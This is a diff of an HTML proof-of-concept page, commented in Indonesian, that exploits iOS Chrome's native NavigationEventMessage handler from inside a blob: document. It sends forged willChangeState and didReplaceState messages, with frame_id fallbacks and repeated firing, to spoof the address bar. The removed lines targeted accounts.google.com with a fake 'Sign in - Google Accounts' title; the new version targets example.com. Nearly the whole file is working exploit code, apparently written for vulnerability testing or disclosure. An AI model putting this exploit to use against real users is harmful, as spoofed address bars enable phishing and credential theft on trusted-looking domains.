@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Full Reproduction - iOS Chrome Blob History Spoof</title>
+    <title>PoC Advanced Hardened - iOS Chrome Blob History Spoof</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -14,7 +14,7 @@
             line-height: 1.5;
             background: #fdfdfd;
         }
-        h1 { font-size: 1.4rem; color: #c5221f; }
+        h1 { font-size: 1.4rem; color: #b31412; }
         .card {
             background: #fff8f8;
             border: 1px solid #f5c6cb;
@@ -23,7 +23,7 @@
             margin-bottom: 15px;
         }
         button {
-            background: #c5221f;
+            background: #b31412;
             color: white;
             border: none;
             padding: 12px 20px;
@@ -33,7 +33,7 @@
             font-weight: bold;
             margin-top: 8px;
         }
-        button:hover { background: #a51d1a; }
+        button:hover { background: #920d0b; }
         pre {
             background: #202124;
             color: #e8eaed;
@@ -43,41 +43,39 @@
             font-size: 0.85rem;
             max-height: 250px;
         }
-        .pass { color: #81c995; font-weight: bold; }
-        .fail { color: #f28b82; font-weight: bold; }
         .info { color: #8ab4f8; }
     </style>
 </head>
 <body>
 
-    <h1>iOS Chrome History Spoof - Full Reproduction PoC</h1>
-    <p>Halaman ini menguji apakah pemanggilan <code>didReplaceState</code> dari dalam dokumen <code>blob:</code> lintas asal berhasil mengubah *address bar* tanpa validasi origin yang ketat.</p>
+    <h1>iOS Chrome History Spoof - Advanced Hardened PoC</h1>
+    <p>Halaman ini menguji secara agresif validasi <code>IsHistoryStateChangeValid</code> pada iOS Chrome menggunakan payload blob terenkapsulasi.</p>
 
     <div class="card">
-        <h3>1. Generator & Launcher Blob Terenkapsulasi</h3>
-        <p>Membuat objek blob mandiri yang membawa skrip eksploitasi langsung ke dalam *context* blob.</p>
-        <button id="launch-btn">Mulai Reproduksi Ulang (Launch Blob)</button>
-        <pre id="launcher-log">Status: Menunggu interaksi pengguna...</pre>
+        <h3>1. Hardened Blob Launcher</h3>
+        <p>Membuat objek blob mandiri dengan skrip eksploitasi multi-tahap tingkat lanjut.</p>
+        <button id="launch-btn">Jalankan Hardened PoC</button>
+        <pre id="launcher-log">Status: Menunggu eksekusi...</pre>
     </div>
 
     <div class="card">
-        <h3>2. Log Eksekusi & Hasil Reproduksi</h3>
-        <pre id="diag-log">Log sistem akan muncul di sini setelah blob dimuat...\n</pre>
+        <h3>2. Live Execution Log</h3>
+        <pre id="diag-log">Log sistem akan muncul di sini...\n</pre>
     </div>
 
 <script>
-    const VICTIM = "accounts.google.com";
+    const VICTIM = "example.com";
 
-    // Template HTML yang akan dieksekusi di dalam Blob URL mandiri
+    // Template HTML payload yang dimasukkan ke dalam Blob URL
     const BLOB_DOC = `<!doctype html>
 <meta charset=utf-8>
-<title>Sign in - Google Accounts</title>
+<title>Example Domain - Spoof Target</title>
 <style>
-  body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff0f0; }
-  h2 { color: #c00; }
-  pre { background: #111; color: #00ff00; padding: 12px; font-size: 11px; white-space: pre-wrap; }
+  body { font-family: -apple-system, sans-serif; margin: 2em; background: #fff5f5; }
+  h2 { color: #b31412; }
+  pre { background: #111; color: #5af78e; padding: 12px; font-size: 11px; white-space: pre-wrap; }
 </style>
-<h2>Blob Sandbox Active</h2>
+<h2>Hardened Blob Context Active</h2>
 <p>Asal Dokumen (Origin): <code id="origin"></code></p>
 <p>URL Saat Ini: <code id="cur-url"></code></p>
 <pre id="blob-log"></pre>
@@ -85,105 +83,103 @@
 (function(){
   function bLog(msg) {
     document.getElementById('blob-log').textContent += msg + '\\n';
-    try { console.log('[BlobPoC] ' + msg); } catch(e){}
+    try { console.log('[HardenedPoC] ' + msg); } catch(e){}
   }
   
   document.getElementById('origin').textContent = location.origin || '(opaque)';
   document.getElementById('cur-url').textContent = location.href;
-  bLog('Blob dokumen berhasil dimuat.');
+  bLog('Hardened blob dokumen berhasil di-render.');
 
-  // Deteksi handler komunikasi natif iOS Chrome
   var mh = (window.webkit && window.webkit.messageHandlers) || {};
   if (!mh.NavigationEventMessage) {
-    bLog('SKIP: window.webkit.messageHandlers.NavigationEventMessage tidak ditemukan.');
+    bLog('SKIP: window.webkit.messageHandlers.NavigationEventMessage tidak tersedia.');
     return;
   }
   bLog('SUCCESS: Handler NavigationEventMessage terdeteksi.');
 
-  // Ambil frame_id dari page-world __gCrWeb
-  var fid = null;
-  try {
-    if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
-      fid = window.__gCrWeb.getFrameId();
-      bLog('__gCrWeb.getFrameId() = ' + fid);
-    }
-  } catch(e) {
-    bLog('Gagal membaca frame_id: ' + e.message);
-  }
+  // Pengambilan frame_id yang diperkuat (dengan berbagai opsi fallback)
+  var getFid = function() {
+    try {
+      if (window.__gCrWeb && typeof window.__gCrWeb.getFrameId === 'function') {
+        return window.__gCrWeb.getFrameId();
+      }
+    } catch(e) {}
 
-  // Fallback pencarian frame_id jika struktur berbeda
-  if (!fid && window.__gCrWeb) {
     var tries = [
       function(){ return window.__gCrWeb.common.getFrameId(); },
       function(){ return window.__gCrWeb.message.getFrameId(); },
       function(){ return window.__gCrWeb.frameId; },
     ];
-    for (var i = 0; i < tries.length && !fid; i++) {
-      try { fid = tries[i](); bLog('fallback['+i+'] -> ' + fid); } catch(e){}
+    for (var i = 0; i < tries.length; i++) {
+      try { var f = tries[i](); if (f) return f; } catch(e){}
     }
-  }
+    return null;
+  };
 
-  if (!fid) {
-    bLog('FAIL: Tidak dapat menemukan frame_id yang valid.');
-    return;
-  }
+  var fid = getFid();
+  bLog('Frame ID terdeteksi: ' + (fid || 'TIDAK DITEMUKAN'));
 
-  // Target spoofing alamat bar
-  var spoofUrl = 'blob:https://' + "${VICTIM}" + '/signin';
+  // Target spoofing alamat bar menggunakan example.com
+  var spoofUrl = 'blob:https://' + "${VICTIM}" + '/';
   bLog('Target spoof URL: ' + spoofUrl);
 
-  // Fungsi pengiriman postMessage berulang untuk mengatasi race condition
-  var fireSpoof = function(attempt) {
+  // Fungsi pengiriman payload agresif berkali-kali untuk menghindari race condition
+  var firePayload = function(index) {
+    var currentFid = getFid() || fid;
+    if (!currentFid) {
+      bLog('[' + index + '] Gagal: Frame ID kosong.');
+      return;
+    }
     try {
       mh.NavigationEventMessage.postMessage({
-        command: 'willChangeState', frame_id: fid
+        command: 'willChangeState', frame_id: currentFid
       });
       mh.NavigationEventMessage.postMessage({
-        command: 'didReplaceState', frame_id: fid,
+        command: 'didReplaceState', frame_id: currentFid,
         stateObject: '', baseUrl: 'https://x/',
         pageUrl: spoofUrl
       });
-      bLog('[' + attempt + '] Berhasil mengirimkan didReplaceState dengan target: ' + spoofUrl);
+      bLog('[' + index + '] Payload berhasil dikirimkan dengan fid: ' + currentFid.slice(0,8));
     } catch(err) {
-      bLog('[' + attempt + '] Gagal postMessage: ' + err.message);
+      bLog('[' + index + '] Error saat postMessage: ' + err.message);
     }
   };
 
-  // Eksekusi beruntun (multi-delay) untuk menjamin penanganan native
-  fireSpoof(1);
-  setTimeout(function(){ fireSpoof(2); }, 150);
-  setTimeout(function(){ fireSpoof(3); }, 400);
+  // Eksekusi beruntun dengan interval ketat
+  firePayload(1);
+  setTimeout(function(){ firePayload(2); }, 100);
+  setTimeout(function(){ firePayload(3); }, 300);
+  setTimeout(function(){ firePayload(4); }, 600);
+
   setTimeout(function(){
-    bLog('\\n--- STATUS AKHIR ---');
-    bLog('Periksa Address Bar Anda.');
-    bLog('Jika menampilkan "' + "${VICTIM}" + '" tanpa awalan blob:, kerentanan berhasil direproduksi.');
-    bLog('Jika tetap menampilkan URL blob asli, proteksi keamanan aktif dan menolak state change.');
-  }, 800);
+    bLog('\\n--- EVALUASI AKHIR ---');
+    bLog('Periksa bilah alamat (Address Bar) perangkat Anda.');
+    bLog('Jika menampilkan "' + "${VICTIM}" + '": Proteksi gagal / Rentan.');
+    bLog('Jika tetap menampilkan awalan blob: URL: Proteksi berhasil / Aman.');
+  }, 1000);
 })();
 <\/script>`;
 
-    function startReproduction() {
+    function startHardenedPoC() {
         try {
             const diag = document.getElementById('diag-log');
-            diag.textContent += "[*] Membuat Blob objek lokal...\n";
+            diag.textContent += "[*] Mempersiapkan payload blob...\n";
             
             const blob = new Blob([BLOB_DOC], { type: 'text/html' });
             const blobUrl = URL.createObjectURL(blob);
             
-            // [FIXED] Memperbaiki sintaks innerHTML yang sebelumnya salah
-            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke: ${blobUrl}</span>`;
-            diag.textContent += `[*] Mengalihkan navigasi ke: ${blobUrl}\n`;
+            document.getElementById('launcher-log').innerHTML = `<span class="info">Mengarahkan ke Blob URL: ${blobUrl}</span>`;
+            diag.textContent += `[*] Navigasi otomatis menuju: ${blobUrl}\n`;
             
-            // Eksekusi navigasi otomatis ke blob URL
             setTimeout(() => {
                 location.href = blobUrl;
-            }, 600);
+            }, 500);
         } catch (e) {
-            document.getElementById('launcher-log').innerHTML = `<span class="fail">Error: ${e.message}</span>`;
+            document.getElementById('launcher-log').innerHTML = `<span style="color:red">Error: ${e.message}</span>`;
         }
     }
 
-    document.getElementById('launch-btn').addEventListener('click', startReproduction);
+    document.getElementById('launch-btn').addEventListener('click', startHardenedPoC);
 </script>
 
 </body>
